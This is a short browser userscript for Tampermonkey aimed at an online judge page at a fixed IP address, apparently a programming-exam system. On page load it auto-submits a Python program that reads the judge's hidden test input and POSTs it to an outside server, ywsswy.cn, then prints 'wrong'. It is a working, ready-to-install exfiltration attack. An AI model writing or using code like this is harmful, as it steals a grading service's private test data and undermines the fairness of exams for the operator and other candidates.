// ==UserScript==
// @name         CCF
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://118.190.20.162/view.page?*
// @require      http://code.jquery.com/jquery-1.11.0.min.js
// @grant        none
// ==/UserScript==
(function() {
    'use strict';
    // Your code here...
    function ywsDelay(){
        var s1 = '2';
        s1 = "import urllib.request\nimport json\ndata_list = []\nwhile True:\n  try:\n    temp = input()\n    data_list.append(temp)\n  except EOFError:\n    break\ndata = json.dumps(data_list)\ndata = 'input={}'.format(data)\ndata = data.encode('utf-8')\nurl = 'http://ywsswy.cn:84'\nreq = urllib.request.Request(url) \nreq.add_header('Content-Type', 'application/x-www-form-urlencoded;charset=utf-8')\nres = urllib.request.urlopen(req, data).read()\nprint('wrong')";
        $('#ucode').val(s1);
        $('#sure_pythonstd').prop('checked',true);
        $('#sure_extra').prop('checked',true);
        $('.orangebtn').eq(1).trigger("click");
    }
    $(document).ready(function(){
        setTimeout(ywsDelay,850);
    })
})();
